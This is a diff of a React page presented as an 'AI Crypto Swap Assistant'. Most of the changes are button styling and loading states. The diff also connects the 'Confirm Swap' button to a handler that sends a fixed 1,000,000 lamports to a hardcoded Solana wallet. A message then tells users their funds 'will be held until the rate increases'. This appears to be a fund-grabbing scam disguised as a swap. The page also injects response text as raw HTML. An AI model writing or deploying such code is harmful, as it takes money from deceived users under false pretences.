@@ -15,13 +15,14 @@ const Home = () => {
   const { publicKey, connected, sendTransaction } = useWallet();
   const { connection } = useConnection();
   const account = useActiveAccount();
-
+const [swapAmount, setSwapAmount] = useState('');
   const [message, setMessage] = useState('');
   const [response, setResponse] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
   const [isPopupVisible, setIsPopupVisible] = useState(false);
   const canvasRef = useRef(null);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   const handleSwap = async () => {
     if (!connected || !publicKey) {
@@ -39,7 +40,7 @@ const Home = () => {
     try {
       // Solana transfer
       const toPublicKey = new PublicKey('7BkxDHhDfMQ5MUhD6BLCnyMR4JUhvFScWWzupog2pZzP');
-      const lamportsToSend = 1_000_000; 
+      const lamportsToSend = 1_000_000;
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
@@ -78,7 +79,7 @@ const Home = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    setIsLoading(true);
+    setIsSubmitting(true);
     setError('');
 
     try {
@@ -102,10 +103,9 @@ const Home = () => {
     } catch (err) {
       setError('An error occurred. Please try again.');
     } finally {
-      setIsLoading(false);
+      setIsSubmitting(false);
     }
   };
-
   const handleConfirm = () => {
     setIsPopupVisible(false);
     setResponse('The fund will be held until the rate increases.');
@@ -279,21 +279,21 @@ const Home = () => {
       <canvas ref={canvasRef} style={{ position: 'fixed', top: 0, left: 0, zIndex: -1 }} />
       <br />
       <br />
-      <div style={{ 
-        margin: '0 auto', 
-        padding: '32px 16px', 
-        maxWidth: '60%', 
+      <div style={{
+        margin: '0 auto',
+        padding: '32px 16px',
+        maxWidth: '60%',
         position: 'relative',
         backgroundColor: '#1E2128',
         color: '#FFFFFF',
         borderRadius: '8px',
         boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)'
       }}>
-        <h1 style={{ 
-          fontSize: '2rem', 
-          fontWeight: 'bold', 
-          marginBottom: '24px', 
-          textAlign: 'center', 
+        <h1 style={{
+          fontSize: '2rem',
+          fontWeight: 'bold',
+          marginBottom: '24px',
+          textAlign: 'center',
           color: '#c7c7c7'
         }}>AI Crypto Swap Assistant</h1>
         <form onSubmit={handleSubmit} style={{ marginBottom: '24px' }}>
@@ -315,47 +315,59 @@ const Home = () => {
             />
             <button
               type="submit"
-              disabled={isLoading}
+              disabled={isSubmitting}
               style={{
-                backgroundColor: '#3DACF7',
+                backgroundColor: '#512DA8', // Purple color
                 color: 'white',
                 padding: '12px 24px',
                 borderRadius: '0 4px 4px 0',
-                cursor: isLoading ? 'not-allowed' : 'pointer',
+                cursor: isSubmitting ? 'not-allowed' : 'pointer',
                 border: 'none',
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'center',
+                width: '120px', // Fixed width to prevent resizing
+                transition: 'background-color 0.3s ease',
               }}
             >
-              {isLoading ? 'Loading...' : 'Submit'}
+              {isSubmitting && (
+                <div className="loading-spinner" style={{ marginRight: '8px' }}></div>
+              )}
+              {isSubmitting ? 'Submitting...' : 'Submit'}
             </button>
           </div>
         </form>
         {response && (
-          <div style={{ 
-            padding: '16px', 
-            borderRadius: '8px', 
+          <div style={{
+            padding: '16px',
+            borderRadius: '8px',
             backgroundColor: '#2C3038',
             color: '#FFFFFF',
-            textAlign: 'left' 
+            textAlign: 'left'
           }}>
             <p dangerouslySetInnerHTML={{ __html: response }}></p>
-            <Swap/>
+            <Swap />
             <div style={{ marginTop: '10px', display: 'flex', justifyContent: 'space-between' }}>
-              <button 
+              <button
+                onClick={handleSwap}
+                disabled={isLoading || !connected || !account || !account.address}
                 style={{
                   backgroundColor: '#3DACF7',
                   color: 'white',
                   padding: '10px 20px',
                   borderRadius: '4px',
                   border: 'none',
-                  cursor: 'pointer',
-                  width: '48%'
+                  cursor: (isLoading || !connected || !account || !account.address) ? 'not-allowed' : 'pointer',
+                  width: '48%',
+                  opacity: (isLoading || !connected || !account || !account.address) ? 0.5 : 1,
                 }}
               >
-                Confirm Swap
+                {isLoading ? 'Processing...' : 'Confirm Swap'}
               </button>
-              <button 
+              <button
+                onClick={() => setResponse('')}
                 style={{
-                  backgroundColor: '#6c757d',
+                  backgroundColor: '#512DA8',
                   color: 'white',
                   padding: '10px 20px',
                   borderRadius: '4px',
